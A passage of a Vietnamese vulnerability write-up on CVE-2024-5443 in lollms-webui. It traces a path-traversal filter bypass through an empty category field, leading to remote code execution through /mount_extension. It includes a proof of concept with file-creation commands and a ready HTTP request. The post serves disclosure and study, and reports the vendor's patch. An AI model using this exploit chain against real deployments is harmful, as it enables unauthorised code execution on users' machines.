</span></span><span class="line"><span class="cl">        <span class="n">package_full_path</span> <span class="o">=</span> <span class="n">lollmsElfServer</span><span class="o">.</span><span class="n">lollms_paths</span><span class="o">.</span><span class="n">personalities_zoo_path</span><span class="o">/</span><span class="n">package_path</span> <span class="c1"># [4]</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="n">config_file</span> <span class="o">=</span> <span class="n">package_full_path</span> <span class="o">/</span> <span class="s2">&#34;config.yaml&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">config_file</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">config_file</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">config</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">safe_load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;status&#34;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span> <span class="s2">&#34;config&#34;</span><span class="p">:</span><span class="n">config</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
</span></span></code></pre></div><p>Tại [1][2], các giá trị <code>data.category</code> và <code>data.name</code> là các giá trị mà người dùng có thể hoàn toàn kiểm soát được, đồng thời các giá trị này nều được đi qua bộ lọc là hàm <code>sanitize_path()</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sanitize_path</span><span class="p">(</span><span class="n">path</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span> <span class="n">allow_absolute_path</span><span class="p">:</span><span class="nb">bool</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">error_text</span><span class="o">=</span><span class="s2">&#34;Absolute database path detected&#34;</span><span class="p">,</span> <span class="n">exception_text</span><span class="o">=</span><span class="s2">&#34;Detected an attempt of path traversal. Are you kidding me?&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">path</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="c1"># Regular expression to detect patterns like &#34;....&#34; and multiple forward slashes</span>
</span></span><span class="line"><span class="cl">    <span class="n">suspicious_patterns</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;(\.\.+)|(/+/)&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">suspicious_patterns</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="ow">or</span> <span class="p">((</span><span class="ow">not</span> <span class="n">allow_absolute_path</span><span class="p">)</span> <span class="ow">and</span> <span class="n">Path</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">is_absolute</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">        <span class="n">ASCIIColors</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="n">error_text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">HTTPException</span><span class="p">(</span><span class="n">status_code</span><span class="o">=</span><span class="mi">400</span><span class="p">,</span> <span class="n">detail</span><span class="o">=</span><span class="n">exception_text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">allow_absolute_path</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">path</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">path</span>
</span></span></code></pre></div><p>như ta thấy rõ rằng, bộ lọc kiểm soát khá chặt chẽ để ngăn chặn sử dụng các ký tự đặc biệt để thoát ra khỏi đường dẫn mặc định nên các input bắt đầu bằng các payload như <code>../</code>, <code>/</code>, <code>\</code>, … và cũng như các đường dẫn được xem là absolute path đều bị phát hiện.</p>
<p>Tại [3], hai giá trị <code>data.category</code> và <code>data.name</code> được nối với nhau bởi dấu phân cách / và kết quả sẽ được nối vào đường dẫn mặc định mà người dùng chỉ được phép truy cập tại [4].</p>
<p>Trên python cho phép chúng ta có thể append một Path object với một chuỗi để thực hiện nối các đường dẫn lại với nhau, ví dụ:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">&gt;&gt;&gt; from pathlib import Path
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">a</span> <span class="o">=</span> Path<span class="o">(</span><span class="s2">&#34;/home/user/public/&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">b</span> <span class="o">=</span> <span class="s2">&#34;etc/passwd&#34;</span>
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; a/b
</span></span><span class="line"><span class="cl">PosixPath<span class="o">(</span><span class="s1">&#39;/home/user/public/etc/passwd&#39;</span><span class="o">)</span>
</span></span></code></pre></div><p>nhưng nếu chuỗi được nối tiếp bắt đầu bằng dấu phân cách / (hoặc có dạng absolute path) thì đường dẫn trước đó sẽ bị bỏ qua</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">&gt;&gt;&gt; from pathlib import Path
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">a</span> <span class="o">=</span> Path<span class="o">(</span><span class="s2">&#34;/home/user/public/&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">b</span> <span class="o">=</span> <span class="s2">&#34;/etc/passwd&#34;</span>
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; a/b
</span></span><span class="line"><span class="cl">PosixPath<span class="o">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="o">)</span>
</span></span></code></pre></div><p>Vì thế lỗ hổng xảy ra ở đây là các giá trị <code>data.category</code> và <code>data.name</code> không check giá trị rỗng dẫn đến kẻ tấn công có thể lạm dụng dấu phân cách giữa hai giá trị này tạo thành đường dẫn tuyệt đối và control được đường dẫn bất kỳ dựa vào giá trị thứ hai</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">category</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">name</span> <span class="o">=</span> <span class="s2">&#34;tmp/hacked&#34;</span>
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">package_path</span> <span class="o">=</span> f<span class="s2">&#34;{category}/{name}&#34;</span>
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; package_path
</span></span><span class="line"><span class="cl"><span class="s1">&#39;/tmp/hacked&#39;</span>
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">package_full_path</span> <span class="o">=</span> Path<span class="o">(</span><span class="s2">&#34;/home/user/public/&#34;</span><span class="o">)</span>/package_path
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; package_full_path
</span></span><span class="line"><span class="cl">PosixPath<span class="o">(</span><span class="s1">&#39;/tmp/hacked&#39;</span><span class="o">)</span>
</span></span></code></pre></div><p>Tuyệt vời, đến đây có thể khẳng định rằng đã có thể bypass được filter, nhưng tại endpoint <code>/get_personality_config</code> này có vẻ việc khai thác path traversal không tạo ra được mức độ nghiêm trọng của vấn đề nên mình phải rà soát thêm các chức năng khác.</p>
<h4 id="more-impact-more-money">#More impact, more money<a hidden class="anchor" aria-hidden="true" href="#more-impact-more-money">#</a></h4>
<p>Sau khi tham khảo lần lượt các lỗ hổng đã được công bố trước đó, thì mình tìm được một lỗ hổng có mã <code>CVE-2024-4320</code> được mô tả rất chi tiết bởi @retr0reg (Xem chi tiết tại: <a href="https://huntr.com/bounties/d6564f04-0f59-4686-beb2-11659342279b%29">https://huntr.com/bounties/d6564f04-0f59-4686-beb2-11659342279b)</a>.</p>
<p>Lỗ hổng mô tả rằng tại endpoint <code>/install_extension</code>, cho phép kẻ tấn công khai thác lỗ hổng Path Traversal thông qua biến <code>extension_path</code> đến đường dẫn mà kẻ tấn công đã tải mã độc lên và thực thi hàm <code>ExtensionBuilder().build_extension()</code> để thực hiện load malicous code.</p>
<p>Mình đã thực hiện kiểm tra nhanh rằng hiện tại thì lỗ hổng đã được vá ở <code>/install_extension</code> endpoint, nhưng mình phát hiện ra rằng có thể thực thi hàm <code>ExtensionBuilder().build_extension()</code> gián tiếp qua hàm <code>lollmsElfServer.rebuild_extensions()</code> của một endpoint khác là <code>/mount_extension</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># lollms_core\lollms\server\endpoints\lollms_extensions_infos.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ... more code</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nd">@router.post</span><span class="p">(</span><span class="s2">&#34;/mount_extension&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mount_extension</span><span class="p">(</span><span class="n">data</span><span class="p">:</span><span class="n">ExtensionMountingInfos</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;- Mounting extension&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">category</span> <span class="o">=</span> <span class="n">sanitize_path</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">category</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">sanitize_path</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">folder</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="n">package_path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">category</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">package_full_path</span> <span class="o">=</span> <span class="n">lollmsElfServer</span><span class="o">.</span><span class="n">lollms_paths</span><span class="o">.</span><span class="n">extensions_zoo_path</span><span class="o">/</span><span class="n">package_path</span>
</span></span><span class="line"><span class="cl">    <span class="n">config_file</span> <span class="o">=</span> <span class="n">package_full_path</span> <span class="o">/</span> <span class="s2">&#34;config.yaml&#34;</span> <span class="c1"># [5]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">config_file</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">lollmsElfServer</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;extensions&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">package_path</span><span class="p">)</span> <span class="c1"># [6]</span>
</span></span><span class="line"><span class="cl">        <span class="n">lollmsElfServer</span><span class="o">.</span><span class="n">mounted_extensions</span> <span class="o">=</span> <span class="n">lollmsElfServer</span><span class="o">.</span><span class="n">rebuild_extensions</span><span class="p">()</span> <span class="c1"># [7]</span>
</span></span></code></pre></div><p>Như mô tả bên trên, ta hoàn toàn có thể bypass để điều khiển giá trị <code>package_full_path</code> đến một đường dẫn theo ý của chúng ta. Tại [5], kiểm tra xem file <code>config.yaml</code> có tồn tại trong folder hay không nếu tồn tại thì đường dẫn <code>package_full_path</code> sẽ được thêm vào danh sách các extension được định nghĩa tại <code>lollmsElfServer.config[&quot;extensions&quot;]</code> ở [6]. Tại [7], sẽ thực thi hàm <code>lollmsElfServer.rebuild_extensions()</code> như sau:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># lollms_webui.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ... more code</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">LOLLMSWebUI</span><span class="p">(</span><span class="n">LOLLMSElfServer</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">rebuild_extensions</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">reload_all</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># ...</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">extension</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;extensions&#39;</span><span class="p">]):</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># ...</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">extension</span> <span class="ow">in</span> <span class="n">loaded_names</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">               <span class="c1"># ...</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">extension_path</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">lollms_paths</span><span class="o">.</span><span class="n">extensions_zoo_path</span><span class="o">/</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">extension</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">extension</span> <span class="o">=</span> <span class="n">ExtensionBuilder</span><span class="p">()</span><span class="o">.</span><span class="n">build_extension</span><span class="p">(</span><span class="n">extension_path</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">lollms_paths</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># ...</span>
</span></span></code></pre></div><p>Tại đây, chương trình sẽ thực hiện lặp hết tất cả các đường dẫn <code>extension_path</code> nằm trong config được thêm ở [5], sau đó thực hiện load chúng lên thông qua hàm <code>ExtensionBuilder().build_extension()</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># lollms_core\lollms\extension.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ... more code</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ExtensionBuilder</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">build_extension</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="n">extension_path</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="n">lollms_paths</span><span class="p">:</span><span class="n">LollmsPaths</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">app</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">installation_option</span><span class="p">:</span><span class="n">InstallOption</span><span class="o">=</span><span class="n">InstallOption</span><span class="o">.</span><span class="n">INSTALL_IF_NECESSARY</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">-&gt;</span><span class="n">LOLLMSExtension</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="n">extension</span><span class="p">,</span> <span class="n">script_path</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">getExtension</span><span class="p">(</span><span class="n">extension_path</span><span class="p">,</span> <span class="n">lollms_paths</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span> <span class="c1"># [8]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">extension</span><span class="p">(</span><span class="n">app</span> <span class="o">=</span> <span class="n">app</span><span class="p">,</span> <span class="n">installation_option</span> <span class="o">=</span> <span class="n">installation_option</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">getExtension</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="n">extension_path</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="n">lollms_paths</span><span class="p">:</span><span class="n">LollmsPaths</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">app</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">-&gt;</span><span class="n">LOLLMSExtension</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="n">extension_path</span> <span class="o">=</span> <span class="n">lollms_paths</span><span class="o">.</span><span class="n">extensions_zoo_path</span> <span class="o">/</span> <span class="n">extension_path</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="c1"># define the full absolute path to the module</span>
</span></span><span class="line"><span class="cl">        <span class="n">absolute_path</span> <span class="o">=</span> <span class="n">extension_path</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># infer the module name from the file path</span>
</span></span><span class="line"><span class="cl">        <span class="n">module_name</span> <span class="o">=</span> <span class="n">extension_path</span><span class="o">.</span><span class="n">stem</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># use importlib to load the module from the file path</span>
</span></span><span class="line"><span class="cl">        <span class="n">loader</span> <span class="o">=</span> <span class="n">importlib</span><span class="o">.</span><span class="n">machinery</span><span class="o">.</span><span class="n">SourceFileLoader</span><span class="p">(</span><span class="n">module_name</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">absolute_path</span> <span class="o">/</span> <span class="s2">&#34;__init__.py&#34;</span><span class="p">))</span> <span class="c1"># [9]</span>
</span></span><span class="line"><span class="cl">        <span class="n">extension_module</span> <span class="o">=</span> <span class="n">loader</span><span class="o">.</span><span class="n">load_module</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">extension</span><span class="p">:</span><span class="n">LOLLMSExtension</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">extension_module</span><span class="p">,</span> <span class="n">extension_module</span><span class="o">.</span><span class="n">extension_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">extension</span><span class="p">,</span> <span class="n">absolute_path</span>
</span></span></code></pre></div><p>Khi hàm <code>ExtensionBuilder().build_extension()</code> thực thi, sẽ tiếp tục gọi hàm <code>ExtensionBuilder().getExtension()</code> tại [8], vì <code>extension_path</code> luôn là giá trị absolute path mà ta truyền vào nên có thể dễ dàng control được giá trị của biến absolute_path theo ý của mình. Đồng thời tại [9], hàm <code>ExtensionBuilder().getExtension()</code> sẽ tìm file <code>__init__.py</code> trong đường dẫn mà kẻ tấn công cung cấp để thực hiện load mã bên trong file này.</p>
<h3 id="exploit-conditions">#Exploit Conditions<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h3>
<ul>
<li>Phải biết <code>discussion_id</code></li>
<li>Phải biết đường dẫn đến folder <code>personal_data</code></li>
</ul>
<h3 id="proof-of-concept">#Proof-of-Concept<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h3>
<p>Thực hiện tạo một cuộc hội thoại bất kỳ
<img loading="lazy" src="/images/cve-2024-5443-path-traversal-to-rce/2.png"></p>
<p>Tạo 2 file có tên lần lượt là <code>config.yaml</code> và <code>__init__.py</code> như bên dưới</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;import os; os.system(&#39;calc.exe&#39;);&#34;</span> &gt; __init__.py
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;FOOOO&#34;</span> &gt; config.yaml
</span></span></code></pre></div><p>Và sau đó upload các file <code>config.yaml</code> and <code>__init__.py</code> vừa tạo thông qua chức năng <code>Send file to AI</code>
<img loading="lazy" src="/images/cve-2024-5443-path-traversal-to-rce/3.png"></p>
<p>Send request như bên dưới để trigger RCE</p>
<pre tabindex="0"><code>POST /mount_extension HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Content-Length: 177
 
{
  &#34;category&#34;: &#34;&#34;,
  &#34;folder&#34;: &#34;/path/to/personal_data/discussion_databases/default/&lt;discussion_id&gt;/text_data&#34;,
  &#34;client_id&#34;: &#34;jg9yock1FmRZdONsAAAH&#34;,
  &#34;language&#34;: &#34;vi&#34;
}
</code></pre><p>Trong đó, <code>discussion_id</code> ta có thể dễ dàng brute-force bởi vì biến này mang giá trị là một số nguyên dễ đoán
<img loading="lazy" src="/images/cve-2024-5443-path-traversal-to-rce/9.png"></p>
<h3 id="the-patch">#The patch<a hidden class="anchor" aria-hidden="true" href="#the-patch">#</a></h3>
<p>Mình đã nhanh chóng report lỗ hổng này trên huntr và vendor đã nhanh chóng acknowledged lỗ hổng này
<img loading="lazy" src="/images/cve-2024-5443-path-traversal-to-rce/5.png"></p>
<p>và bản vá cho lỗ hổng lần này này chỉ đơn giản là xóa các chức năng nguy hiểm này đi
<img loading="lazy" src="/images/cve-2024-5443-path-traversal-to-rce/8.png"></p>
<h3 id="conclusion">#Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h3>
<p>Cuối cùng, mình muốn gửi lời cảm ơn đến huntr đã tạo nên một nền tảng hết sức thú vị này, và đồng thời cảm ơn huntr đã chia sẽ và mang bài phân tích này đến với cộng đồng.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/research/">Research</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/posts/me_sqli_to_rce/">
    <span class="title">« Prev</span>
    <br>
    <span>ManageEngine Adaudit Plus – From SQLi to RCE</span>
  </a>
  <a class="next" href="http://localhost:1313/posts/cve-2022-3133-drawio-xss-to-rce/">
    <span class="title">Next »</span>
    <br>
    <span>[CVE-2022-3133] Draw.io – XSS leads to RCE</span>
  </a>
</nav>



  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>©nhienit</span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
